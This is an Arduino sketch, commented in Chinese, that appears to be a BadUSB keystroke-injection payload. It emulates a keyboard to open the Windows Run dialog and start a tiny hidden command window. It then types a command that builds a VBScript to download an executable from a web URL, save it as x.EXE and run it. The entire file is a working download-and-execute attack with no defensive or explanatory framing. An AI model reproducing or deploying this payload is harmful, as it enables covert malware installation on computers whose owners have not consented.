void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD.EXE /t:01 /k MODE con:cols=16 lines=5");
  delay(2000); 
  Keyboard.println("ECHO sET XpOST = cREATEoBJECT(\"mICROSOFT.xmlhttp\") >WEBDOWN.VBS&ECHO XpOST.oPEN \"get\",\"HTTP://WWW.BAIDU.COM/MD5.EXE\",0 >>WEBDOWN.VBS&ECHO XpOST.sEND() >>WEBDOWN.VBS&ECHO sET SgET = cREATEoBJECT(\"adodb.sTREAM\") >>WEBDOWN.VBS&ECHO SgET.mODE = 3 >>WEBDOWN.VBS&ECHO SgET.tYPE = 1 >>WEBDOWN.VBS&ECHO SgET.oPEN() >>WEBDOWN.VBS&ECHO SgET.wRITE(XpOST.RESPONSEbODY) >>WEBDOWN.VBS&ECHO SgET.sAVEtOfILE \"x.EXE\",2 >>WEBDOWN.VBS&ECHO WSCRIPT.CREATEOBJECT(\"WSCRIPT.SHELL\").RUN \"X.EXE\" >>WEBDOWN.VBS&&WEBDOWN.VBS&&EXIT"); 
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
